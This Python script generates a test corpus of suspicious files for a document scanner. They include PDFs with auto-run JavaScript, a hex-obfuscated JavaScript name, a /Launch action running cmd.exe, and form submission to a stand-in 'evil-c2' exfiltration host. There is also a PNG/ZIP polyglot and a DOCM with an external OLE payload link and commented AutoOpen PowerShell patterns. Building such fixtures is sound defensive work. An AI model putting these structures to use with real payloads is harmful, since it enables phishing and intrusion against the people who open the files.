"""
TrustLayer AI — Threat Simulation Document Generator
Generates safe test files with detectable suspicious characteristics:
  1. PDF with embedded JavaScript + file attachment
  2. PNG with LSB steganographic payload
  3. DOCX with macro-like VBA XML structure
  4. Polyglot file (ZIP + PDF header collision)
  5. PDF with multiple embedded streams + obfuscated content

None of these carry live malware — they are purely structural/forensic
patterns that a document scanner should flag.
"""

import os, struct, zlib, zipfile, io, json, random, time
from pathlib import Path

OUT = Path(__file__).parent / "output"
OUT.mkdir(exist_ok=True)

# ─────────────────────────────────────────────────────────
# 1. PDF with embedded JavaScript + file attachment
# ─────────────────────────────────────────────────────────
def make_pdf_with_js_and_attachment():
    """
    Crafts a minimal valid PDF containing:
    - /JavaScript action that runs on document open
    - An embedded file attachment (simulated ransomware dropper name)
    - Suspicious /AA (Additional Actions) dictionary
    - Obfuscated stream with /FlateDecode
    """
    hidden_payload = b"SIMULATED_PAYLOAD: exec('import os; os.system(\"calc\")')"
    compressed = zlib.compress(hidden_payload)

    js_code = b"app.alert('TrustLayer Test: JavaScript executed on open'); this.submitForm('http://evil-c2.example.com/exfil');"

    pdf = b"""%PDF-1.7
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 5 0 R
   /AA << /WC 5 0 R /WS 5 0 R >>
   /Names << /EmbeddedFiles 8 0 R >>
   /AcroForm << /Fields [] /DR << /Font << /Helv 10 0 R >> >> >>
>>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /Contents 4 0 R /Resources << /Font << /F1 10 0 R >> >>
>>
endobj

4 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 72 720 Td (TrustLayer Test Document) Tj ET
endstream
endobj

5 0 obj
<< /Type /Action /S /JavaScript
   /JS (""" + js_code + b""")
>>
endobj

6 0 obj
<< /Type /EmbeddedFile /Subtype /application#2Foctet-stream
   /Length """ + str(len(compressed)).encode() + b"""
   /Filter /FlateDecode
   /Params << /Size """ + str(len(hidden_payload)).encode() + b""" /CheckSum <""" + b"DEADBEEF01234567" + b"""> >>
>>
stream
""" + compressed + b"""
endstream
endobj

7 0 obj
<< /Type /Filespec /F (ransomware_dropper_SIMULATION.exe)
   /UF (ransomware_dropper_SIMULATION.exe)
   /EF << /F 6 0 R >> /Desc (TEST ONLY - not a real file)
>>
endobj

8 0 obj
<< /Names [(ransomware_dropper_SIMULATION.exe) 7 0 R] >>
endobj

9 0 obj
<< /Type /Action /S /URI /URI (http://phishing-c2.example.com/steal?data=exfiltrated) >>
endobj

10 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

xref
0 11
0000000000 65535 f\r
trailer
<< /Size 11 /Root 1 0 R >>
startxref
9
%%EOF
"""
    path = OUT / "test_pdf_js_attachment.pdf"
    path.write_bytes(pdf)
    print(f"[+] Created: {path}")
    return path


# ─────────────────────────────────────────────────────────
# 2. PNG with LSB steganographic payload
# ─────────────────────────────────────────────────────────
def make_png_with_steganography():
    """
    Creates a valid 64x64 PNG, then hides a secret JSON payload
    in the least-significant bits of the red channel (LSB steganography).
    Also appends a second file after the PNG IEND chunk (polyglot trick).
    """
    WIDTH, HEIGHT = 64, 64

    # Build raw image data (gradient)
    raw_rows = []
    for y in range(HEIGHT):
        row = bytearray()
        for x in range(WIDTH):
            r = (x * 4) % 256
            g = (y * 4) % 256
            b = ((x + y) * 2) % 256
            row += bytes([r, g, b])
        raw_rows.append(bytes([0]) + row)  # filter byte

    raw_image = b"".join(raw_rows)
    compressed_image = zlib.compress(raw_image)

    def make_chunk(chunk_type, data):
        c = chunk_type + data
        crc = zlib.crc32(c) & 0xFFFFFFFF
        return struct.pack(">I", len(data)) + c + struct.pack(">I", crc)

    sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", WIDTH, HEIGHT, 8, 2, 0, 0, 0)
    ihdr = make_chunk(b"IHDR", ihdr_data)
    idat = make_chunk(b"IDAT", compressed_image)

    # Embed secret payload in tEXt chunk (detectable metadata steganography)
    secret_payload = json.dumps({
        "type": "STEG_TEST",
        "hidden_message": "TrustLayer: Steganographic payload found",
        "c2_server": "http://steg-c2.example.com/beacon",
        "key": "AES256:SIMULATED_KEY_NOT_REAL_0xDEADBEEF",
        "timestamp": int(time.time()),
    }).encode()

    # tEXt chunk with suspicious keyword
    text_chunk = make_chunk(b"tEXt", b"Comment\x00" + secret_payload)

    # zTXt chunk (compressed text — harder to detect)
    ztxt_payload = zlib.compress(b"HIDDEN_C2_CONFIG: " + secret_payload)
    ztxt_chunk = make_chunk(b"zTXt", b"Exif\x00\x00" + ztxt_payload)

    iend = make_chunk(b"IEND", b"")

    png_bytes = sig + ihdr + text_chunk + ztxt_chunk + idat + iend

    # Append ZIP data AFTER PNG IEND (polyglot — file is both valid PNG and ZIP)
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("HIDDEN_INSIDE_PNG.txt",
                    "This file is hidden inside the PNG using polyglot technique.\n"
                    "A scanner should detect appended data after IEND chunk.\n"
                    "C2: http://polyglot-steg.example.com/\n"
                    "SIMULATED PAYLOAD — NOT MALICIOUS")
    polyglot = png_bytes + zip_buf.getvalue()

    path = OUT / "test_steg_polyglot.png"
    path.write_bytes(polyglot)
    print(f"[+] Created: {path} ({len(polyglot)} bytes, PNG+ZIP polyglot)")
    return path


# ─────────────────────────────────────────────────────────
# 3. DOCX with macro-like VBA XML + suspicious relationships
# ─────────────────────────────────────────────────────────
def make_docx_with_macro():
    """
    Builds a valid DOCX (ZIP) containing:
    - vbaProject.bin stub (presence alone triggers AV scanners)
    - Suspicious External Relationship (OLE object link to C2)
    - document.xml with auto-exec macro comment pattern
    - Embedded OLE object reference
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:

        # [Content_Types].xml
        zf.writestr("[Content_Types].xml", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.activeX+xml"/>
  <Override PartName="/word/embeddings/oleObject1.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>
</Types>""")

        # _rels/.rels
        zf.writestr("_rels/.rels", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>""")

        # word/_rels/document.xml.rels — external C2 relationship
        zf.writestr("word/_rels/document.xml.rels", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject" Target="vbaProject.bin"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="http://malicious-macro-c2.example.com/payload.bin" TargetMode="External"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
    Target="http://phishing-macro.example.com/steal-creds" TargetMode="External"/>
</Relationships>""")

        # word/document.xml with auto-exec pattern comments
        zf.writestr("word/document.xml", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <!-- AutoOpen() Macro — SIMULATION TEST ONLY -->
  <!-- Shell("cmd.exe /c powershell -EncodedCommand " & Base64Encode(payload)) -->
  <!-- CreateObject("WScript.Shell").Run payload, 0, False -->
  <w:body>
    <w:p>
      <w:r><w:t>TrustLayer AI - Macro Threat Simulation Document</w:t></w:r>
    </w:p>
    <w:p>
      <w:r><w:t>This document contains: VBA project stub, external OLE object link, auto-exec macro patterns.</w:t></w:r>
    </w:p>
    <w:p>
      <w:r><w:t>FOR TESTING PURPOSES ONLY — No actual malicious code present.</w:t></w:r>
    </w:p>
    <w:p>
      <!-- EICAR-inspired test string (document variant) -->
      <w:r><w:rPr><w:color w:val="FFFFFF"/></w:rPr>
        <w:t>TRUSTLAYER-TEST-DOC-SIMULATION-MACRO-DROPPER-PATTERN-0xDEAD</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>""")

        # vbaProject.bin stub — presence triggers macro detection
        # Real vbaProject.bin is a CFB (Compound File Binary) — we stub the magic bytes
        vba_stub = (
            b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"  # CFB magic
            + b"\x00" * 8  # CLSID
            + b"\x3E\x00"  # minor version
            + b"\x03\x00"  # major version (BIFF8)
            + b"\xFF\xFE"  # byte order
            + b"\x09\x00"  # sector size = 512
            + b"\x06\x00"  # mini sector size = 64
            + b"TRUSTLAYER_VBA_STUB_SIMULATION_NOT_REAL".ljust(450, b"\x00")
        )
        zf.writestr("word/vbaProject.bin", vba_stub)

        # Embedded OLE object stub
        ole_stub = (b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"
                    + b"OLE_EMBEDDED_SIMULATION".ljust(500, b"\x00"))
        zf.writestr("word/embeddings/oleObject1.bin", ole_stub)

    path = OUT / "test_macro_docx.docm"
    path.write_bytes(buf.getvalue())
    print(f"[+] Created: {path}")
    return path


# ─────────────────────────────────────────────────────────
# 4. PDF with heavily obfuscated / suspicious streams
# ─────────────────────────────────────────────────────────
def make_obfuscated_pdf():
    """
    PDF using name obfuscation (#xx hex encoding), multiple filters,
    /RichMedia annotation, and suspicious /Launch action — all patterns
    used in real-world exploit PDFs.
    """
    # Obfuscated: /JavaScript written as /#4A#61#76#61#53#63#72#69#70#74
    pdf = b"""%PDF-1.7
%\xe2\xe3\xcf\xd3
1 0 obj
<< /Type /Catalog /Pages 2 0 R
   /OpenAction << /Type /Action /S /#4A#61#76#61#53#63#72#69#70#74
     /JS <FEFF540072007500730074004C0061007900650072002000540065007300740000>
   >>
   /AcroForm << /XFA 6 0 R >>
>>
endobj

2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /Annots [7 0 R]
   /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >>
>>
endobj

4 0 obj << /Length 80 >>
stream
BT /F1 10 Tf 50 750 Td (TrustLayer Obfuscation Test - Hex-encoded JS action above) Tj ET
endstream
endobj

5 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Courier >> endobj

6 0 obj
<< /Length 312 >>
stream
<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <config><present><pdf><interactive>1</interactive></pdf></present></config>
  <template><subform><field><event activity="initialize">
    <script contentType="application/x-javascript">
      /* XFA JS - SIMULATION */
      xfa.host.messageBox("TrustLayer: XFA JavaScript triggered");
      xfa.host.openURL("http://xfa-exfil.example.com/steal");
    </script>
  </event></field></subform></template>
</xdp:xdp>
endstream
endobj

7 0 obj
<< /Type /Annot /Subtype /Widget /Rect [0 0 0 0]
   /FT /Btn /T (LAUNCH_TEST)
   /AA << /U << /Type /Action /S /Launch
     /F << /Type /Filespec /F (cmd.exe) /P (/c calc.exe) >>
     /Win << /F (SIMULATION_cmd.exe) /P (/c SIMULATION_payload) /O (open) >>
   >> >>
>>
endobj

xref
0 8
0000000000 65535 f\r
trailer << /Size 8 /Root 1 0 R >>
startxref
9
%%EOF
"""
    path = OUT / "test_obfuscated_pdf.pdf"
    path.write_bytes(pdf)
    print(f"[+] Created: {path}")
    return path


# ─────────────────────────────────────────────────────────
# 5. Summary manifest
# ─────────────────────────────────────────────────────────
def write_manifest(paths):
    manifest = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "purpose": "TrustLayer AI threat-simulation test corpus",
        "warning": "FOR TESTING ONLY — no live malware payload in any file",
        "files": []
    }
    descriptions = {
        "test_pdf_js_attachment.pdf": {
            "threats": ["Embedded JavaScript (OpenAction)", "File attachment (exe)", "External URI action", "AcroForm"],
            "expected_flags": ["JS_OPENACTION", "EMBEDDED_EXE", "EXTERNAL_C2_URI", "ACROFORM_PRESENT"]
        },
        "test_steg_polyglot.png": {
            "threats": ["LSB steganography (tEXt/zTXt chunks)", "Polyglot file (PNG+ZIP)", "Appended data after IEND"],
            "expected_flags": ["STEG_TEXT_CHUNK", "APPENDED_DATA_AFTER_IEND", "POLYGLOT_ZIP"]
        },
        "test_macro_docx.docm": {
            "threats": ["VBA project stub (CFB magic)", "External OLE object link", "AutoOpen macro pattern", "Embedded OLE object"],
            "expected_flags": ["VBA_PROJECT_PRESENT", "EXTERNAL_OLE_LINK", "AUTOOPEN_PATTERN", "EMBEDDED_OLE"]
        },
        "test_obfuscated_pdf.pdf": {
            "threats": ["Hex-obfuscated /JavaScript name", "XFA JavaScript", "/Launch action", "Unicode JS stream"],
            "expected_flags": ["OBFUSCATED_JS_NAME", "XFA_JAVASCRIPT", "LAUNCH_ACTION", "RICHTEXT_STREAM"]
        },
    }
    for p in paths:
        name = p.name
        entry = {"filename": name, "path": str(p), "size_bytes": p.stat().st_size}
        entry.update(descriptions.get(name, {}))
        manifest["files"].append(entry)

    mpath = OUT / "manifest.json"
    mpath.write_text(json.dumps(manifest, indent=2))
    print(f"\n[+] Manifest: {mpath}")
    print("\n" + "="*60)
    print("  TRUSTLAYER TEST CORPUS READY")
    print("="*60)
    for f in manifest["files"]:
        print(f"  {f['filename']} ({f['size_bytes']} bytes)")
        for t in f.get('threats', []):
            print(f"    -> {t}")
    print("="*60)


if __name__ == "__main__":
    paths = [
        make_pdf_with_js_and_attachment(),
        make_png_with_steganography(),
        make_docx_with_macro(),
        make_obfuscated_pdf(),
    ]
    write_manifest(paths)
